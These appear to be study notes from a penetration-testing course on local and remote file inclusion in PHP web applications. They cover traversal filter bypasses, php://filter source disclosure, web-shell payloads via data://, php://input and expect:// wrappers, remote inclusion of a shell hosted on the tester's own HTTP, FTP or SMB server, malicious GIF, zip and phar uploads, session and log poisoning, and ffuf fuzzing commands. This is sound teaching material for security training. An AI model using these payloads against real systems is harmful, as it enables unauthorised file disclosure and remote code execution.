
The following table shows which functions may execute files and which only read file content:

|  Function 	     |   Read Content 	 |       Execute 	         |   Remote URL|
|----------------|-----------------------|------------------------|-----------------|
|PHP |			
|include()/include_once() 	  |  ✅ 	       |         ✅ 	       |                  ✅|
|require()/require_once() 	  |  ✅ 	         |       ✅ 	             |            ❌|
|file_get_contents() 	     |   ✅ 	           |     ❌ 	        |                 ✅|
|fopen()/file() 	          |      ✅ 	         |       ❌              |              ❌|
|NodeJS 			|
|fs.readFile() 	         |       ✅ 	       |         ❌ 	          |               ❌|
|fs.sendFile() 	            |    ✅ 	        |        ❌ 	           |              ❌|
|res.render() 	        |        ✅ 	           |     ✅ 	        |                 ❌|
|Java 			|
|include 	          |          ✅ 	        |        ❌ 	          |               ❌|
|import 	              |          ✅ 	    |            ✅ 	     |                    ✅|
|.NET 			|
|@Html.Partial() 	      |      ✅ 	             |   ❌ 	           |              ❌|
@Html.RemotePartial() 	        ✅ 	                ❌ 	           |              ✅|
|Response.WriteFile() 	     |   ✅ 	             |   ❌ 	                 |        ❌|
|include 	             |       ✅ 	             |   ✅ 	                 |        ✅|




! Two common readable files that are available on most back-end servers are /etc/passwd on Linux and C:\Windows\boot.ini on Windows. 


# Path Traversal


we read a file by specifying its absolute path (e.g. /etc/passwd). This would work if the whole input was used within the include() function without any additions, like the following example:

    include($_GET['language']);

However, in many occasions, web developers may append or prepend a string to the language parameter. For example, the language parameter may be used for the filename, and may be added after a directory, as follows:

```include("./languages/" . $_GET['language']);```

We can easily bypass this restriction by traversing directories using relative paths. To do so, we can add ../ before our file name, which refers to the parent directory. For example, if the full path of the languages directory is /var/www/html/languages/, then using ../index.php would refer to the index.php file on the parent directory (i.e. /var/www/html/index.php).

So, we can use this trick to go back several directories until we reach the root path (i.e. /), and then specify our absolute file path (e.g. ../../../../etc/passwd), and the file should exist: 


Tip: It can always be useful to be efficient and not add unnecessary ../ several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of ../ that works and use it.



#### Filename Prefix

we can prefix a / before our payload, and this should consider the prefix as a directory, and then we should bypass the filename and be able to traverse directories: 


## Appended Extensions

Another very common example is when an extension is appended to the language parameter, as follows:


```include($_GET['language'] . ".php");```



## Second-Order Attacks

Another common, and a little bit more advanced, LFI attack is a Second Order Attack. This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.

For example, a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png). If we craft a malicious LFI username (e.g. ../../../etc/passwd), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.


In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a Second-Order attack.





## Basic Bypasses


#### Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (../) to avoid path traversals.

```$language = str_replace('../', '', $_GET['language']);```


 this filter is very insecure, as it is not recursively removing the ../ substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal. Let's try applying this logic to include /etc/passwd again: 


 The ....// substring is not the only bypass we can use, as we may use ..././ or ....\/ and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. ....\/), or adding extra forward slashes (e.g. ....////)


 #### Encoding

 Some web filters may prevent input filters that include certain LFI-related characters, like a dot . or a slash / used for path traversals. However, some of these filters may be bypassed by URL encoding our input, such that it would no longer include these bad characters, but would still be decoded back to our path traversal string once it reaches the vulnerable function.

 Note: For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.



#### Approved Paths

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:
```
    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
        include($_GET['language']);
    } else {
        echo 'Illegal path specified!';
    }
```
    
To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify, as follows: 


Some web applications may apply this filter along with one of the earlier filters, so we may combine both techniques by starting our payload with the approved path, and then URL encode our payload or use recursive payload.




#### Appended Extension


As discussed in the previous section, some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).



#### Path Truncation



In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (/etc/passwd/.) then the /. would also be truncated, and PHP would call (/etc/passwd). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. ////etc/passwd is the same as /etc/passwd). Similarly, a current directory shortcut (.) in the middle of the path would also be disregarded (e.g. /etc/./passwd).

 Finally, it is also important to note that we would also need to start the path with a non-existing directory for this technique to work.

 ```?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times```
 
 
 ```$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done```




#### Null Bytes


PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.



## PHP Filters


Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different PHP Wrappers to be able to extend our LFI exploitation, and even potentially reach remote code execution.


PHP Wrappers allow us to access different I/O streams at the application level, like standard input/output, file descriptors, and memory streams. 


#### Input Filters

PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.

There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.


#### Fuzzing for PHP Files

The first step would be to fuzz for different available PHP pages with a tool like ffuf or gobuster

```$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php```


Tip: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.


#### Standard PHP Inclusion

if you tried to include any php files through LFI, you would have noticed that the included PHP file gets executed, and eventually gets rendered as a normal HTML page


This is where the base64 php filter gets useful, as we can use it to base64 encode the php file, and then we would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where we are dealing with LFI with appended PHP extensions, because we may be restricted to including PHP files only, as discussed in the previous section.



#### Source Code Disclosure

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the base64 PHP filter. Let's try to read the source code of config.php using the base64 filter, by specifying convert.base64-encode for the read parameter and config for the resource parameter, as follows:

```php://filter/read=convert.base64-encode/resource=config```


this is if the app automatically appends .php in the end of the request ,else we will have to provide it





## Gaining RCE


### PHP Wrappers


#### Data Wrapper



only available to use if the (allow_url_include) setting is enabled 

- include the PHP configuration file found at /etc/php/X.Y/apache2/php.ini for Apache 
- or at /etc/php/X.Y/fpm/php.ini for Nginx, where X.Y is your install PHP version

```
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

```



```$ echo '<?php system($_GET["cmd"]); ?>' | base64```


Now, we can URL encode the base64 string, and then pass it to the data wrapper with data://text/plain;base64,. Finally, we can use pass commands to the web shell with &cmd=<COMMAND>: 
```
    $ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```



#### Input Wrapper


used to include external input. The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data.
The vulnerable parameter must accept POST requests and also depends on the allow_url_include setting, aswell

Add the  web shell as POST data and pass  a GET parameter with the command to execute:

```$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid```


Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)




#### Expect Wrapper

Designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server

```$ echo '<base64 encoded php.ini>' | base64 -d | grep expect```

To use the expect module, we can use the expect:// wrapper and then pass the command we want to execute, as follows:

```$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"```






## RFI





### Verify RFI


 any remote URL inclusion in PHP would require the allow_url_include setting to be enabled
```
    $ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"


    $ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

The first step in gaining remote code execution is creating a malicious script in the language of the web application,



```$ echo '<?php system($_GET["cmd"]); ?>' > shell.php```

Host this script and include it through the RFI vulnerability.



#### HTTP Server
```$ sudo python3 -m http.server <LISTENING_PORT>```

```http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id```



#### FTP Server

```$ sudo python -m pyftpdlib -p 21```

```http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id```


If the server requires valid authentication, then the credentials can be specified in the URL, as follows:

```$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'```


#### SMB Server

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion


```$ impacket-smbserver -smb2support share $(pwd)```

```http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami```






--LFI and File Uploads

If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.


-Image upload

the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.


-Crafting Malicious Image

we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:

$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

Note: We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type.


## Uploaded File Path


#### Crafting Malicious files

```$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif```


To include the uploaded file, we need to know the path to our uploaded file. In our case, if we inspect the source code


```<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">```


Note:  If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file

include the uploaded file in the LFI vulnerable function

```http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id```


Note: To include to our uploaded file, we used ./profile_images/ as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to ../ out of that directory and then use our URL path, as we learned in previous sections.




#### Zip Upload

We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, 
we create a PHP web shell script and zipping it into a zip archive 

``$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php``




```http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id```


Note: We added the uploads directory (./profile_images/) before the file name, as the vulnerable page (index.php) is in the main directory.




#### Phar Wrapper


write the following PHP script into a shell.php file:
```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:
```
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
we can call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id)

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```





## Log Poisoning




#### PHP Session Poisoning

Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows.


The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.

So, let's first check if we have a PHPSESSID cookie set to our session

- include this session file 

```http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd```


Let's try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with ?language=session_poisoning specified, as follows:

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```


Now, let's include the session file once again to look at the contents: 
```http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd```


This time, the session file contains session_poisoning instead of es.php, which confirms our ability to control the value of page in the session file. Our next step is to perform the poisoning step by writing PHP code to the session file. We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:

```http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E```

we can include the session file and use the &cmd=id to execute a commands: 

```http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id```


Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.




#### Server Log Poisoning


Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.


Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.


By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.


```http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log```


As we can see, we can read the log. The log contains the remote IP address, request page, response code, and the User-Agent header. As mentioned earlier, the User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value.


Tip: Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.


To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning: 

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (?cmd=id)


Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well. 


Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:

    /var/log/sshd.log
    /var/log/mail
    /var/log/vsftpd.log

We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.




## Automated Scanning


- Fuzzing Parameters

```$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287```


Tip: For a more precise scan, we can limit our scan to the most popular LFI parameters found on:

https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters




#### LFI wordlists

There are a number of LFI Wordlists we can use for this scan. A good wordlist is LFI-Jhaddix.txt, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the ?language= parameter we have been testing throughout the module, as follows:

(https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)


```$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287```


#### Fuzzing Server Files


- Server Webroot


We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its /uploads directory through relative paths (e.g. ../../uploads). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.


To do so, we can fuzz for the index.php file through common webroot paths, which we can find in this wordlist ( https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt ) for Linux or this wordlist  (  https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt  ) for Windows. Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.


```$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287```




#### Server Logs/Configurations

we may also use the LFI-Jhaddix.txt wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this wordlist  (   https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux   ) for Linux or this wordlist   (   https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows   )  for Windows.


```$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287```


We will read (/etc/apache2/apache2.conf), as it is a known path for the apache server configuration and it may reveal some files we might cheks afterwards:

```$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf```


some variables like APACHE_LOG_DIR could be found in files discovered by fuzzinf like
/etc/apache2/envvars



## LFI Tools

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are LFISuite, LFiFreak, and liffy. We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.





